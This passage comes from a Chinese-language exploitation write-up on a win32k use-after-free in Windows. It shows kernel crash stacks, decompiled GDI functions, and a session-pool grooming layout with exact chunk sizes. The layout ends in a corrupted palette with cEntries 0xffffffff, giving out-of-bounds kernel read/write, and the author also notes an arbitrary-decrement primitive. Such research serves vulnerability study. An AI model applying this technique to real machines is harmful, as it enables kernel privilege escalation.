&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; k
 # Child-SP          RetAddr               Call Site
00 ffffce01`fe163e28 fffff801`2d87ff22     nt!DbgBreakPointWithStatus
01 ffffce01`fe163e30 fffff801`2d87f7d2     nt!KiBugCheckDebugBreak+0x12
02 ffffce01`fe163e90 fffff801`2d7ef0d7     nt!KeBugCheck2+0x922
03 ffffce01`fe1645a0 fffff801`2d7fa3a9     nt!KeBugCheckEx+0x107
04 ffffce01`fe1645e0 fffff801`2d7f9b3c     nt!KiBugCheckDispatch+0x69
05 ffffce01`fe164720 fffff801`2d7f54ad     nt!KiSystemServiceHandler+0x7c
06 ffffce01`fe164760 fffff801`2d690284     nt!RtlpExecuteHandlerForException+0xd
07 ffffce01`fe164790 fffff801`2d68f063     nt!RtlDispatchException+0x404
08 ffffce01`fe164e80 fffff801`2d7fa482     nt!KiDispatchException+0x143
09 ffffce01`fe165540 fffff801`2d7f8957     nt!KiExceptionDispatch+0xc2
0a ffffce01`fe165720 fffff801`2d6c722d     nt!KiPageFault+0x217
0b ffffce01`fe1658b0 ffffdec2`f99ee08d     nt!ExReleasePushLockExclusiEx+0x1d
0c ffffce01`fe165910 ffffdec2`f96bf14b     win32kbase!HmgShareLockCheck+0x2dd
0d ffffce01`fe165990 ffffdec2`f96be828     win32kfull!EPALOBJ::EPALOBJ+0x1b
0e ffffce01`fe1659c0 ffffdec2`f96be677     win32kfull!GreGetPaletteEntries+0x28
0f ffffce01`fe165a10 fffff801`2d7f9f13     win32kfull!NtGdiDoPalette+0xb7
10 ffffce01`fe165a90 00007ff8`75b51964     nt!KiSystemServiceCopyEnd+0x13
11 000000ca`718ff748 00007ff8`756bd197     win32u!NtGdiDoPalette+0x14
12 000000ca`718ff750 00007ff8`76524d71     gdi32full!GetPaletteEntries+0x17
13 000000ca`718ff790 00007ff7`174d5ecc     GDI32!GetPaletteEntriesStub+0x41
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;根据调用栈可以看到问题在 ExReleasePushLockExclusiveEx，一通逆向发现问题是因为在 pool 释放后，pool manager 会在 pool 中写上 SINGLE_LIST_ENTRY 这个结构，这样就破坏了原本 palette 对象中 gdi header 结构的 hHmgr 字段，这个字段用于表示该对象的内核句柄。HmgShareLockCheck 会通过这个 hHmgr 来定位内核对象的锁，由于这个 hHmgr 被破坏了因此最终找到的锁也不对，于是在释放锁的时候造成了 page fault。&lt;/p&gt;

&lt;p&gt;直接使用悬空 palette 的思路行不通了，因为在对象释放后 palette 的结构会被破坏。而我们需要一个不受释放操作影响、再被释放后依旧能操作自己的对象（并且必须得是 session page pool 中的）。好在在这个坑作者已经踩过了，还专门挖出来一个手法用于操作内存，那就是 NtGdiSetLinkedUFIs：&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;NtGdiSetLinkedUFIs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                   &lt;span class=&quot;n&quot;&gt;HDC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PUNIVERSAL_FONT_ID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pufiLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                 &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bRet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UNIVERSAL_FONT_ID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pufiQuickLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QUICK_LINKS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PUNIVERSAL_FONT_ID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;//...        &lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUICK_LINKS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BALLOC_OVERFLOW1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UNIVERSAL_FONT_ID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PUNIVERSAL_FONT_ID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;PALLOCNOZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UNIVERSAL_FONT_ID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;difG&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pufiQuickLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;RtlCopyMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pufiLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                          &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UNIVERSAL_FONT_ID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;XDCOBJ&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dco&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hdc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dco&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bValid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bRet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dco&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bSetLinkedUFIs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dco&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vUnlockFast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;XDCOBJ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bSetLinkedUFIs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PUNIVERSAL_FONT_ID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pufis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UINT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bTurnOffLinking&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// If pufi hasn't been initialized or it is too small, reinitialize it.&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uNumLinkedFonts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aQuickLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;VFREEMEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUICK_UFI_LINKS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aQuickLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PUNIVERSAL_FONT_ID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                 &lt;span class=&quot;n&quot;&gt;PALLOCMEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UNIVERSAL_FONT_ID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ddaG&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;WARNING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GDI: XDCOBJ::bSetLinkedUFIs of of memory&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uNumLinkedFonts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uNumLinkedFonts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dclevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pufi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pufis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UNIVERSAL_FONT_ID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uNumUFIs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;根据代码可以看到，如果对于每个 hdc 句柄如果第一次调用，只要 nNumUFIs 大于 QUICK_UFI_LINKS （值为 4）这个宏，那么就会申请一块任意大小的内存空间，而如果第二次调用，那么则可以直接实现对于该块内存写。&lt;/p&gt;

&lt;p&gt;作者在文中提到，还有个 NtGdiGetLinkedUFIs 函数可以用于读内存，但是我大致浏览代码没有看懂如何用这个函数去读取 NtGdiSetLinkedUFIs 后的内存，这个函数名字跟我所想的实际功能并不一样。&lt;/p&gt;

&lt;p&gt;好了，现在我们可以使用 NtGdiSetLinkedUFIs 分配并写一块内存，那么如何通过这个函数去影响 palette？由于我们没有读的能力，如果直接覆盖整个 palette 头，那么就会出现与之前一样的问题， hHmgr 字段会被破坏导致 palette 无法使用。因此我们需要排布内存，让 NtGdiSetLinkedUFIs 所分配的内存位置刚好对准 palette 的 cEntries 字段。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    +------------------------+            +------------------------+                                                                                                                                
    |                        |            |                        |                                                                                                                                
    |                        |            |                        |                                                                                                                                
    |      allocated         |            |      allocated         |                                                                                                                                
    |                        |            |                        |                                                                                                                                
    |                        |            |                        |                                                                                                                                
    |------------------------|            |------------------------|                                                                                                                                
    |-------------------------  ----&amp;gt;     |                        |                                                                                                                                
    |                        |            |                        |                                                                                                                                
    |      pufi              |            |         palette        |                                                                                                                                
    |                        |            |                        |                                                                                                                                
    |                        |            |                        |                                                                                                                                
    +------------------------+            +------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;cEntries 字段在 palette 对象的 0x1c 位置，在我们之前设计的内存布局中，最后整个 palette 的大小是 0x7f0，那么可以计算出这个 pufi 的内存大小应该是 0x7d4，但是由于 NtGdiSetLinkedUFIs 在 x64 中需要 8 字节对齐，整个 pool 是 0x10 对齐，所以整个 pufi 的大小设为 0x7e0，减去 pool header 部分，pufi 为 0x7d0，在 pufi 对象+c 的位置就是需要覆盖的 cEntries 字段。这么算下来，尽管不会覆盖掉 hHmgr 字段，但是仍然有 8 字节的对象头和 4 字节的 palette flag 是会被覆盖的，对象头部分被覆盖的位置存储的是 PW32THREAD 指针；另一方面，NtGdiSetLinkedUFIs 是有最小写入限制的，当 uNumUFIs 小于 QUICK_UFI_LINKS (4) 的时候会使用 quick ufi link，因此使用 NtGdiSetLinkedUFIs 必须至少写入 0x20 大小的内容，这意味着 cEntries 字段的后面一两个字段都会被覆盖，不过应该问题不大。&lt;/p&gt;

&lt;p&gt;写代码实践了一下又发现不行崩溃了，重新申请的 pool 必须得跟第二次释放的 pool 在同一个位置，之前没想到这块，也就是说整个 pufi 的大小必须得是 0x7f0，而 palette 得是 0x800。那么需要把上面那块 0x810 大小的占位块释放掉，让整个页被回收，然后再重新申请。但是 0x800 还有一个问题就是当页面被回收后重新分配的时候一个页会被两块 0x800 的占位块直接占满，所以重新设计一下内存布局：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;top 0x910&lt;/li&gt;
  &lt;li&gt;sbtrack 0x80&lt;/li&gt;
  &lt;li&gt;buttom 0x670&lt;/li&gt;
  &lt;li&gt;pufi 大小 0x6f0&lt;/li&gt;
  &lt;li&gt;重新申请的占位块 top 0x900&lt;/li&gt;
  &lt;li&gt;palette 0x700&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;又写了代码，又发现不行，bugcheck 了。打印一下栈：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; k
 # Child-SP          RetAddr               Call Site
00 ffff8b81`37f7bb58 fffff802`64287f22     nt!DbgBreakPointWithStatus
01 ffff8b81`37f7bb60 fffff802`642877d2     nt!KiBugCheckDebugBreak+0x12
02 ffff8b81`37f7bbc0 fffff802`641f70d7     nt!KeBugCheck2+0x922
03 ffff8b81`37f7c2d0 fffff802`642023a9     nt!KeBugCheckEx+0x107
04 ffff8b81`37f7c310 fffff802`64201b3c     nt!KiBugCheckDispatch+0x69
05 ffff8b81`37f7c450 fffff802`641fd4ad     nt!KiSystemServiceHandler+0x7c
06 ffff8b81`37f7c490 fffff802`64098284     nt!RtlpExecuteHandlerForException+0xd
07 ffff8b81`37f7c4c0 fffff802`64097063     nt!RtlDispatchException+0x404
08 ffff8b81`37f7cbb0 fffff802`64202482     nt!KiDispatchException+0x143
09 ffff8b81`37f7d270 fffff802`64200734     nt!KiExceptionDispatch+0xc2
0a ffff8b81`37f7d450 ffffa0e0`cd8620fc     nt!KiGeneralProtectionFault+0xf4
0b ffff8b81`37f7d5e8 ffffa0e0`ce7521f6     win32kbase!HMAssignmentUnlock+0xc
0c ffff8b81`37f7d5f0 ffffa0e0`ce752ca7     win32kfull!xxxSBTrackInit+0x47e
0d ffff8b81`37f7d6d0 ffffa0e0`ce598d93     win32kfull!xxxSBWndProc+0xa57
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;回头看了一眼之前分析的代码，释放 sbtrack 前首先有三个对 sbtrack 中的字段的 unlock 操作，由于我在 NtGdiSetLinkedUFIs 的时候给内存全设为了 0x77，那么在对 lock 减一的时候自然就导致了内存访问异常。&lt;/p&gt;

&lt;p&gt;….!? 等一下！对 lock 减一？内存访问异常？这不就代表我们现在有了一个任意地址减一的原语吗？好吧，这其实是之后我要写的第二个利用手法，现在先跳过这个，继续延续原作者的思路。&lt;/p&gt;

&lt;p&gt;修复这个异常方法也很简单，内存全置 0 就行了。&lt;/p&gt;

&lt;p&gt;至此可以成功获得一个可以越界读写的 palette&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; !dppal ffffa088`c5ad5910 
EPALOBJ structure at 0xffffa088c5ad5910:
--------------------------------------------------
FLONG      flPal         0x501
ULONG      cEntries      0xffffffff
